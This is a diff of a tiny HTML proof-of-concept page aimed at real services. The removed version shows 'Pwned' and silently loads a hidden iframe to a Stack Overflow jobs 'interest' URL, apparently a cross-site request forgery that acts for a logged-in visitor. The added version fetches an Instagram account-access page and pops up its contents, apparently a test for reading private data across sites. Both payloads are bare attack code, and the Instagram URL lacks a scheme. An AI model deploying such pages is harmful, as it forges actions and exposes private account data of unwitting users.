@@ -1,12 +1,9 @@
-<html>
-  <head>
-  </head>
-  <body>
-    Pwned
-    <script>
-      var iframe = document.createElement('iframe');
-      iframe.src = "https://stackoverflow.com/jobs/n/interest/199314?companyPageId=22170&_"+new Date().getTime();
-      document.body.appendChild(iframe);
-    </script>
-  </body>
-</html>
+<html><head><script>
+var x = new XMLHttpRequest();
+x.open("GET","www.instagram.com/accounts/manage_access/",true);
+x.onreadystatechange = function(){if(x.status==200 && x.readyState ==4)
+	alert(x.response);
+};
+x.send();
+</script>
+</head></html>
